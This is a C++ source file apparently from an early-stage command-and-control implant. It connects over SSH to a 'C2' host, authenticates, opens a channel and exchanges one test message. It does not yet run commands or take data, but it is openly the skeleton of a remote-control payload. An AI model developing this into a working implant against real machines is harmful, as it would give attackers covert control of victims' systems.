//
// Created by rip on 6/30/19.
//

#include "Payload.h"

Payload::Payload()
{
    std::cout << "[+] Setting up SSH connection...\n";

    // create the SSH session
    session = ssh_new();
    if (session == nullptr)
    {
        std::cerr << "[-] Couldn't create SSH session\n";
        exit(-1);
    }
    // configure the session
    ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, user.c_str());
}

Payload::~Payload()
{
    tearDown();
}

void Payload::connect()
{
    std::cout << "[+] Connecting to C2...\n";
    int returnCode = ssh_connect(session);
    if (returnCode != SSH_OK)
    {
        std::cerr << "[-] Error connecting to " << host << " : " << ssh_get_error(session) << std::endl;
        tearDown();
        return;
    }

    handleConnection();
}

void Payload::handleConnection()
{
    // authenticate
    std::cout << "[+] Authenticating...\n";
    int returnCode = ssh_userauth_password(session, NULL, pwd.c_str());
    if (returnCode != SSH_AUTH_SUCCESS)
    {
        std::cerr << "[-] Error authenticating: " << ssh_get_error(session) << std::endl;
        tearDown();
        return;
    }

    // get a communication channel to the c2 server
    std::cout << "[+] Opening communication channel...\n";
    if (!openChannel())
    {
        std::cerr << "[-] Session closed without opening a channel\n";
        tearDown();
        return;
    }

    while (true)
    {
        // test communication
        auto cmd = rcvMsg();
        std::cout << "[+] Got cmd from c2: " << cmd << std::endl;
        std::cout << "[+] Sending response to c2\n";
        sendMsg("helloWorld back");
        break;
    }
}

void Payload::tearDown()
{
    if (channel != nullptr)
    {
        if (ssh_channel_is_open(channel))
        {
            ssh_channel_close(channel);
        }
        ssh_channel_free(channel);
    }
    if (session != nullptr)
    {
        if (ssh_is_connected(session))
        {
            ssh_disconnect(session);
        }
        ssh_free(session);
    }
}

bool Payload::openChannel()
{
    channel = ssh_channel_new(session);
    if (channel == nullptr)
    {
        std::cerr << "[-] Error while opening channel: " << ssh_get_error(session) << std::endl;
        tearDown();
        return false;
    }
    int returnCode = ssh_channel_open_session(channel);
    if (returnCode != SSH_OK)
    {
        std::cerr << "[-] Error while opening channel session: " << ssh_get_error(session) << std::endl;
        tearDown();
        return false;
    }
    return true;
};

void Payload::sendMsg(const std::string& msg)
{
    if ((ssh_channel_write(channel, msg.c_str(), (unsigned int) strlen(msg.c_str()))) == SSH_ERROR)
    {
        std::cerr << "[-] Error while writing to channel\n";
    }
}

std::string Payload::rcvMsg()
{
    char buffer[1024] { 0 };
    if ((ssh_channel_read(channel, buffer, sizeof(buffer), 0)) <= 0)
    {
        std::cerr << "[-] Error while reading from channel\n";
    }
    return std::string(buffer);
}